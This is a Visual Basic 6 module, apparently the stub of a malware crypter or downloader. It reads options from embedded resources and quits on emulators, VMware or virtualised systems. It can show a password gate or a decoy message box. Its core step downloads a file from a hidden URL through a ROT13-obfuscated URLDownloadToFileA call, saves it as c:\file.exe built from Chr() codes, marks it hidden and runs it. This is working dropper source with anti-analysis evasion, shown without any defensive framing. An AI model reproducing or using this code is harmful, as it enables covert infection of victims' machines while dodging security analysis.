Attribute VB_Name = "Module2"
Private Const FILE_ATTRIBUTE_HIDDEN = &H2

'Credits:
'drizzle (Resource idea), carb0n
Public Function GetData()
On Error Resume Next

'---------------------------------------------------------------------------------
'Strings assigned data to them.
Dim Respuesta As String, Matador As String
Dim Title As String, Description As String
Dim Bajar As String
Respuesta = GetResData(1000, 1005)
Title = GetResData(1000, 1006)
Description = GetResData(1000, 1007)
Matador = GetResData(1000, 1008)
Bajar = GetResData(1000, 1014)
'----------------------------------------------------------------------------------

'Gets the resources and executes command accordingly.
'----------------------------------------------------------------------------------
Select Case GetResData(1000, 1001)
Case "0"
Case "1"
If AntiEmulator = True Then End
End Select

Select Case GetResData(1000, 1002)
Case "0"
Case "1"
'Call sAnti
End Select

Select Case GetResData(1000, 1003)
Case "0"
Case "1"
If Vmware = True Then End
End Select

Select Case GetResData(1000, 1004)
Case "0"
Case "1"
Dim Mensaje As String
Mensaje = InputBox("Please enter the password.", "Password Selector", Chr(32))
If Mensaje = ROT13(Respuesta, True) Then
Else
End
End If
End Select

Select Case GetResData(1000, 1011)
Case "0"
Case "1"
MsgBox ROT13(Description, True), vbInformation, ROT13(Title, True)
End Select

Select Case GetResData(1000, 1013)
Case "0"
Case "1"
On Error Resume Next
'File = "C:\file.exe"
Dim File As String
File = Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(105) & Chr(108) & Chr(101) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
'Call CallAPIByName("urlmon", "URLDownloadToFileA", 0, ROT13(Bajar, True), "c:\file.exe", 0, 0)
Call CallAPIByName("urlmon", ROT13("b_YQ|„{y|nqa|SvyrN", True), 0, ROT13(Bajar, True), Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(105) & Chr(108) & Chr(101) & Chr(46) & Chr(101) & Chr(120) & Chr(101), 0, 0)
'SetFileAttributes File, &H2
Call CallAPIByName("kernel32", "SetFileAttributesA", &H2)
Shell File, vbNormalFocus
'Shell Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(105) & Chr(108) & Chr(101) & Chr(46) & Chr(101) & Chr(120) & Chr(101), vbNormalFocus
End Select

Select Case GetResData(1000, 1016)
Case "0"
Case "1"
Call InStrAnti
End Select

Select Case GetResData(1000, 1017)
Case "0"
Case "1"
If ImVirtualized = True Then End
End Select
End Function
'----------------------------------------------------------------------------------

